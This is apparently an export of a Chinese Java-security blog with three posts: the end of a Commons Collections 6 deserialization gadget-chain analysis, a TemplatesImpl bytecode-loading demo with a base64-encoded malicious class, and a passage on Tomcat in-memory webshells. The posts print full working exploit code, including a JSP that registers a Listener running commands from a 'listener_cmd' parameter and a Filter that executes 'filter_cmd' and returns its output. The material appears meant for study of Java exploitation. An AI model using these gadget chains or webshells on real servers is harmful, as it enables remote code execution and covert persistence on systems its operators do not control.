        oos.writeObject(hashMap);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
看demo，其实和CC5差不多，不同就是序列化的对象不一样

![](https://s3.hedgedoc.org/demo/uploads/d462d5f7-2153-483f-9c2e-873718b880f7.png)

![](https://s3.hedgedoc.org/demo/uploads/c8ebde39-5ac3-40ca-88b2-387d840fffd9.png)

相同的是都将LazyMap封装到了TiedMapEntry对象

![](https://s3.hedgedoc.org/demo/uploads/3965a520-65ce-4835-bb05-6e4792d43442.png)

![](https://s3.hedgedoc.org/demo/uploads/9cc60eab-f4e4-4f08-9fd5-d46391e6856e.png)

在CC5的分析文章中分析说到，要触发LazyMap.get()方法，TiedMapEntry有三个方法都可以触发

![](https://s3.hedgedoc.org/demo/uploads/3d3172ad-3436-44c4-b840-f3331874ec00.png)

![](https://s3.hedgedoc.org/demo/uploads/67c3fe03-3508-49b5-a26b-c19ecd852b1f.png)

其中hashCode()方法法跟序列化的HashMap对象有关系，我们跟进HashMap.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/e55e47da-bd73-46ec-a130-cc3f32855696.png)

跟进hash()

可以看到，在hash()方法中，会调用key.hashCode()

回到demo中，可以看到HashMap对象传入的key是一个TiedMapEntry对象，所以反序列化HashMap对象的时候，就会调用TiedMapEntry.hashCode()方法，进而触发LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/6dd3ef18-b04c-49cd-8169-2b0f576d0415.png)

只要调用了LazyMap.get()，就可以触发ChainedTransformer.transform()，进而对transformers数组进行回调，最后执行命令

但是，调用HashMap.put()方法的时候，也会调用hashCode()方法，这样的话还序列化就直接执行命令了

![](https://s3.hedgedoc.org/demo/uploads/8897cdd0-be24-4838-8799-ca9e2826769a.png)

![](https://s3.hedgedoc.org/demo/uploads/86cee55e-8e8a-4a94-9a43-1ffb0679149c.png)

这样不符合预期，我们需要在反序列化的时候才能触发命令执行，所以代码需要修改一下

如下图所示，另外写一个Transformer数组对象fackTransformers，并且封装到ChainedTransformer对象中，这样在调用HashMap.put()方法的时候就不会触发我们的命令执行了

![](https://s3.hedgedoc.org/demo/uploads/426c5e82-828d-472d-bb49-bc27461804ef.png)

然后在调用完HashMap.put()方法后，我们需要将能执行命令的Transformer数组对象给封装到ChainedTransformer对象中，这里可以用反射进行更改

![](https://s3.hedgedoc.org/demo/uploads/e609661e-d707-4bee-b587-6e188e11ffb4.png)

但是，还有一个需要改的地方，我们跟进LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/c1deb684-e249-47e2-8a11-7bdcb3383f7e.png)

在调用HashMap.put的时候，成员变量map会被赋值，这里打个断点调试一下

![](https://s3.hedgedoc.org/demo/uploads/ff6459e0-70ce-4042-ac58-a39dedb4564b.png)

如上图所示，因为map在调用HashMap.put的时候并没有赋值，所以进入第58行if的时候，值为false，顺利进入158行的代码逻辑，调用map.put()方法，给map赋值，key和value都是“test”

继续调试，在进入反序列化的时候再次回到了LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/3a8a3672-3b46-4e1b-a19b-6738292bafbd.png)

调试结果如上图所示，此时传入的key是“test”，而map的key也是“test”（第一次进入LazyMap.get()时候赋值），所以在156行的if语句中，map.containsKey(key)的结果是true，所以就直接进入63行的代码，而没有进入if里面触发157行factory.transform()方法

要想进入if里面，就得将map的key给去掉，我们跟进map

![](https://s3.hedgedoc.org/demo/uploads/88f51288-e638-4f7d-92f5-50ecd97d00c2.png)

![](https://s3.hedgedoc.org/demo/uploads/3d860024-6198-4353-ae28-56e516b198e6.png)

可以发现，map来自LazyMap的父类AbstractMapDecorator成员变量map，是个Map对象

所以可以通过Map.clear()或者Map.remove("test");

![](https://s3.hedgedoc.org/demo/uploads/7ca9a1b5-121b-48c0-9f33-3183d2ab5ef3.png)

运行

![](https://s3.hedgedoc.org/demo/uploads/e1179cd2-1e83-4a1d-af58-344728a6ff75.png)

![](https://s3.hedgedoc.org/demo/uploads/eecb6df9-42ca-41b2-9a3f-5c39a1df64c3.png)

成功弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException {

        //Transformer数组对象
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //弄一个不能执行命令的Transformer数组对象，这样在HashMap.put()的时候就不会执行命令
        Transformer[] fackTransformers =  new Transformer[]{};

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(fackTransformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //new一个HashMap对象
        Map map = new HashMap();
        map.put(tiedMapEntry, "aaa");

        //获取LazyMap父类中的map成员变量
        Field field1 = lazyMap.getClass().getSuperclass().getDeclaredField("map");
        field1.setAccessible(true);
        Map map1 = (Map) field1.get(lazyMap);
        //将map的键对清空，即可进入if后面的代码逻辑
        //map1.clear();
        map1.remove("test");

        //获取ChainedTransformer对象中的成员变量iTransformers
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        //将能执行命令的Transformer数组对象给赋值给成员变量iTransformers
        field.set(chainedTransformer, transformers);


        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(map);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409
























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>TemplatesImpl</title>
    <url>/2023/08/22/TemplatesImpl/</url>
    <content><![CDATA[# TemplatesImpl
## 简述
TemplatesImpl这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码
## 分析
### TemplatesImpl.newTransformer()方法
主要是用来实例化一个TemplatesImpl对象，调用了getTransletInstance()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/422d6e9e-a987-45d2-9db6-d10af1c9e695.png)

 ### TemplatesImpl.getTransletInstance()方法
1. 如果_name=null，就直接返回null，所以_name不能为空
2. 如果_class为null，就去调用defineTransletClasses()方法
3. 然后实例化

这里调用了defineTransletClasses()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/4f49f77b-7f62-4c23-9593-971b7d98d28a.png)

### TemplatesImpl.defineTransletClasses()方法
1. 实例化一个TransletClassLoader对象loader，其中调用了_tfactory.getExternalExtensionsMap()，_tfactory肯定不能为空
2. 调用defineClass()加载_bytecodes
3. 
这里调用了TransletClassLoader类，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/56df4873-c66d-489d-ac76-5a32a1f4fc01.png)

### TemplatesImpl.TransletClassLoader类
其实是TemplatesImpl的一个内部类，它继承ClassLoader父类，重写了defineClass方法

![](https://s3.hedgedoc.org/demo/uploads/da1503f2-f80f-477a-aeb7-29ec31ca8849.png)

### 小结
实例化TemplatesImpl对象，需要给下面的几个成员变量赋值
1. _bytecodes	byte[]对象，字节码，自己定义
2. _name		String对象，类名，随便
3. _tfactory		TransformerFactoryImpl对象，new一个

## 测试
首先准备恶意test类，用于获取恶意字节码
恶意类必须继承AbstractTranslet类

```
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class test extends AbstractTranslet {
    public test() {
        super();
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

将恶意类的class文件内容base64编码
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')

![](https://s3.hedgedoc.org/demo/uploads/6f6d9997-0150-47ec-acdd-f611bc6ec7b8.png)

base64内容：

```
yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj

```

再写一个调用类，负责加载这个恶意字节码

```
import java.lang.reflect.Field;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;

public class test1 {
    
    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String name, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(object,value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
            TemplatesImpl templates = new TemplatesImpl();
            setValue(templates,"_name","test111");
            setValue(templates,"_bytecodes", new byte[][]{code});
            setValue(templates,"_tfactory", new TransformerFactoryImpl());
            templates.newTransformer();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

效果：报错，但是不影响我弹计算器

![](https://s3.hedgedoc.org/demo/uploads/42b81fd2-eef1-4d5b-b4ee-a5bb1e64b2a3.png)
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>零碎知识</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马</title>
    <url>/2023/08/22/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[# 1、前言
Listener、Filter只是Servlet的一种扩展机制，在web.xml中配置，在Context容器中进行管理的，而Context容器在初始化的时候，都会有一个ContextConfig对象，这个对象主要就是用来初始化获取关于Context的配置，其中就包括了Listener、Filter、Servlet的配置

学点前置知识，学内存马事半功倍：https://blog.csdn.net/weixin_41835612/category_10674061.html

加载三个Java Web组件的加载顺序是Listen>Filter>Servlet，体现在StandardContext.startInternal()方法中

![](https://s3.hedgedoc.org/demo/uploads/b9111a62-8ea4-4b70-b4c2-6d4c33526a4c.png)

![](https://s3.hedgedoc.org/demo/uploads/2ec66c8d-a0a2-499b-b789-5654939bfb03.png)

![](https://s3.hedgedoc.org/demo/uploads/9b5394e8-175b-4575-ba71-031258d95b9e.png)

# 2、Listener内存马
## 2.1、简述
这里首先讲Listener内存马，因为在 Java Web 应用程序中，Listener 没有路径映射表的概念，只需要添加到Listener集合中即可，比较简单

而在所有的Listener类型中，监听Servlet请求的ServletRequestListener 监听器是需要监听所有的请求的，也就是说，只要有请求，都会触发ServletRequestListener.requestInitialized()方法

所以ServletRequestListener类型的监听器做内存马最适合不过
## 2.2、编写一个Listener
首先写一个Listener，然后在web.xml中配置

```
\\Listener

package com.tomcatd0.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;

public class MyListener implements ServletRequestListener {

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
        String commad = request.getParameter("listener_cmd");
        if(commad != null) {
            try {
                Runtime.getRuntime().exec(commad);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
    }
}

```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <listener>
        <listener-class>com.tomcatd0.listener.MyListener</listener-class>
    </listener>
    
</web-app>

```

![](https://s3.hedgedoc.org/demo/uploads/c3623664-bd6c-4c95-905f-fe0b87b51bfc.png)
成功弹出计算器
## 2.3、调用链分析
在requestInitialized()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/26266cf9-b374-4ee7-94d6-f77097a301d1.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/b5053ba3-f913-4acc-86b1-92810c3ef60e.png)

这里进入了StandardContext.fireRequestInitEvent()方法，可以看到，第3724行有Listener调用了requestInitialized()方法

![](https://s3.hedgedoc.org/demo/uploads/f0a03b5c-fe27-489b-a84d-c60d6c7679bd.png)

代码一个一个往上跟，这个Listener来自3712行中的StandardContext.getApplicationEventListeners()方法，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/2a10f1ce-60bb-42c6-8b48-1a9103f6ac5a.png)

由上图可见，StandardContext.getApplicationEventListeners()方法又调用了StandardContext.applicationEventListenersList这个成员变量，我们跟进

![](https://s3.hedgedoc.org/demo/uploads/f4fa953a-b9ff-408d-b875-0fbf5c97c721.png)

StandardContext.applicationEventListenersList这个成员变量就是个列表，里面装着的正是我们的MyListener

至此，就清楚了Listener是咋被调用的了
1. 从StandardContext.applicationEventListenersList找到Listener
2. 调用StandardContext.fireRequestInitEvent()，触发MyListener.requestInitialized()方法
## 2.4、动态注册Listener实现内存马
我们要动态注册Listener的话，只有向StandardContext.applicationEventListenersList里面添加Listener，这样才能被调用到

现在我们在StandardContext类中搜索“this.applicationEventListenersList”，看看有啥方法可以向里面添加Listener的

![](https://s3.hedgedoc.org/demo/uploads/478edf37-5fdd-40ac-bd2c-31a0f6b88b35.png)

第635行的addApplicationEventListener()方法符合这个条件，那么可以直接写代码了，代码逻辑如下
1. 写一个Listener，然后new一个对象
2. 获取到一个StandardContext对象
3. 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象


完整jsp代码如下：
```
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@page language="java" contentType="text/html; charset=UTF-8" %>

<%-- 写一个Listener，然后new一个对象 --%>
<%
    class MyListener implements ServletRequestListener {
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String commad = request.getParameter("listener_cmd");
            if(commad != null) {
                try {
                    Runtime.getRuntime().exec(commad);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }

    MyListener myListener = new MyListener();
%>

<%-- 获取到一个StandardContext对象 --%>
<%
    RequestFacade requestFacade = (RequestFacade) request;
    Class requestFacadeClass = requestFacade.getClass();
    Field getRequestField = requestFacadeClass.getDeclaredField("request");
    getRequestField.setAccessible(true);
    Request getRequest = (Request) getRequestField.get(requestFacade);
    StandardContext standardContext = (StandardContext) getRequest.getContext();
%>

<%-- 调用StandardContext.addApplicationEventListener()方法，添加我们的Listener对象 --%>
<%
    standardContext.addApplicationEventListener(myListener);
%>
```

## 2.5、验证
在web.xml中没有添加Listener的情况下，输入路由?listener_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/91744b09-dfea-4914-9c81-b8159aef8600.png)

没有弹出记事本，毫无反应

访问实现动态注册的jsp

![](https://s3.hedgedoc.org/demo/uploads/66b215bf-e168-4283-94ab-817b33e6ca00.png)

再次输入路由?listener_cmd=notepad

![](https://s3.hedgedoc.org/demo/uploads/b7d8efbb-6167-4dba-9743-f5f4fdef0471.png)

成功弹出记事本

# 3、Filter内存马
## 3.1、简述
Filter是一种Servlet的扩展机制，在web.xml中配置，在Context容器中进行管理，主要用于对请求和响应进行预处理和后处理的组件

![](https://s3.hedgedoc.org/demo/uploads/0a498d44-9824-45d6-81ce-b82eb18f9769.png)

主要是存储在StandardContext.filterDefs这个成员变量中的
## 3.2、编写一个Filter
首先写一个Filter，然后在web.xml中配置

```
package com.tomcatd0.filter;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MyFilter1 implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String command = servletRequest.getParameter("filter_cmd");
        if (command != null){
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }

            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
```

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    
    <filter>
        <filter-name>MyFilter</filter-name>
        <filter-class>com.tomcatd0.filter.MyFilter</filter-class>
    </filter>
    <filter-mapping>
        <filter-name>MyFilter</filter-name>
        <url-pattern>/myfilter</url-pattern>
    </filter-mapping>
    
</web-app>
```
可以看到，Filter在web.xml的配置和Listener不一样，多了个路由

![](https://s3.hedgedoc.org/demo/uploads/9f9ce15e-f44d-41b6-b52d-078d1b6d5485.png)

成功弹出计算器
## 3.3、调用链分析
在doFilter()方法边上打个断点

![](https://s3.hedgedoc.org/demo/uploads/a0777783-9e84-49ea-928e-e1173212f233.png)

开启调试，调用链如下：

![](https://s3.hedgedoc.org/demo/uploads/fce0d2db-6695-4204-90a0-a967d0ca1731.png)

这里进入了ApplicationFilterChain.internalDoFilter()方法，可以看到，第92行有Filter调用了doFilter()方法

![](https://s3.hedgedoc.org/demo/uploads/421c0023-95fc-477e-8fe2-c32676f39cad.png)

这个Listener来自ApplicationFilterChain.filters这个成员变量，我们跟进ApplicationFilterChain.filters

![](https://s3.hedgedoc.org/demo/uploads/981d0bdc-6726-433f-b147-08ce0dfc1c52.png)

ApplicationFilterChain.filters是一个元素为ApplicationFilterConfig对象的数组，可以看到数组中含有我们写的MyFilter

这里我们搜索关键字“this.filters”，看看哪里可以是否有添加元素的方法

145行的ApplicationFilterChain.addFilter()方法可以向filters添加元素

![](https://s3.hedgedoc.org/demo/uploads/aa80f199-c938-4726-99bf-48885def1db3.png)

这个方法先对现在的filters进行遍历，将传入的ApplicationFilterConfig对象与filters中的ApplicationFilterConfig对象进行对比，如果想等，则直接跳出循环（149-152行）；如果不想等，则先判断此时的n的长度和filers的长度是否相同，如果相同，则将filters的长度扩大10，最后将传入的ApplicationFilterConfig对象添加到filtrs中，同时n增长1

其实就是判断添加进的ApplicationFilterConfig对象是否重复，并且在添加时候判断filters满了没，满了就扩大10个位置，免得ApplicationFilterConfig对象装不进去

但是值得注意的是，这里的ApplicationFilterChain.filters最开始里面并没有元素（new ApplicationFilterConfig[0];），也就是说并没有Filter对象，而这里却包含了我们的MyFilter，说明给filters添加元素的方法在后面的调用链中

所以在后面的调用链中重点关注“ApplicationFilterChain”和“addFilter”

继续调试跟进，在进入StandardWrapperValve.invoke()方法时候，创建了一个ApplicationFilterChain对象filterChain，是通过ApplicationFilterFactory.createFilterChain()方法获取到的

![](https://s3.hedgedoc.org/demo/uploads/866f58ce-6776-490d-ae52-b57867362cb9.png)

跟进ApplicationFilterFactory.createFilterChain()方法，发现第64行调用了ApplicationFilterChain.addFilter()方法

![](https://s3.hedgedoc.org/demo/uploads/1f8a5cb0-7240-40a8-a450-adda06ad2529.png)

![](https://s3.hedgedoc.org/demo/uploads/32fdeec6-a9fa-4b6e-aa77-1a2f8387e1f6.png)

这里稍微分析一下
1. 从Wrapper对象中获取到StandardContext对象
2. 从StandardContext对象获取到FilterMaps对象
3. 遍历FilterMaps对象获取FilterMap对象
4. 判断请求中的路由和FilterMap对象中设置的路由是否想等，同时判断请求中的调度器与FilterMap对象中设置的调度器（dispatcherMapping）是否相同
5. 如果相同，就将FilterMap对象的FilterName传入到StandardContext.getFilterConfig()方法中获取到FilterConfig对象，接着再强转为ApplicationFilterConfig对象
6. 最后将ApplicationFilterConfig对象通过ApplicationFilterChain.addFilter()方法加入到filters中

从流程可以看出，FilterMap是一个存储Filter映射规则的对象

这里6个流程中，第5个流程有点复杂

我们先跟进到StandardContext.getFilterConfig()方法

![](https://s3.hedgedoc.org/demo/uploads/d8580a34-e40d-4dff-a919-6e9ccd9eb339.png)

这么看来，FilterConfig对象其实就是从StandardContext.filterConfigs这个成员变量中获取

跟进StandardContext.filterConfigs

![](https://s3.hedgedoc.org/demo/uploads/469d1f09-334d-48b6-add6-74432be2c220.png)

StandardContext.filterConfigs是一个HashMap对象，用键、值的方式存储，所以StandardContext.getFilterConfig()方法就是通过键（filterName）获取到ApplicationFilterConfig对象

String类型的filterName好解决，但是ApplicationFilterConfig的创建就难了，我们跟进到ApplicationFilterConfig的构造函数

![](https://s3.hedgedoc.org/demo/uploads/73519be3-7a48-4f5b-922c-e9a934d24020.png)

构造函数没有用public修饰，所以只能反射获取ApplicationFilterConfig对象，而且ApplicationFilterConfig需要用到FilterDef对象

